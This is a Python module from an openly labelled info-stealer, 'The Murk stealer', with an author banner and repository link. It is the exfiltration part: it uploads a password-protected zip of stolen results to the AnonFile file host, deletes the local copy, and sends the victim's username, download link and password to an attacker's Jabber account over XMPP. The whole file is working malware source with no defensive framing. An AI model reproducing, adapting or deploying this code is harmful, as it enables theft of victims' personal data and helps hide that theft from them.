#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#
import xmpp
from anonfile import AnonFile
import os


def Send(jabberid,jabberpassword,jabberreceiver,np):

	try:
		user = os.environ['USERPROFILE'].replace("C\\Users\\")
	except:
		PCuser = os.environ['USERPROFILE']
		file = AnonFile()
		try: 
			upload = file.upload(rf'{np[0]}.zip', progressbar=True)
		except Exception as e:
			print(e)
		try:
			os.remove(f'{np[0]}.zip')
			pass
		except Exception as e:
			print(e)
		url = upload.url.geturl()
		print(url)
		message = f'The Murk results\nUser: {PCuser}\nLink: {url}\nPassword: {np[1]}'
		jid = xmpp.protocol.JID(jabberid)
		connection = xmpp.Client(server=jid.getDomain())
		connection.connect()
		connection.auth(user=jid.getNode(), password=jabberpassword, resource=jid.getResource())
		connection.send(xmpp.protocol.Message(to=jabberreceiver, body=message))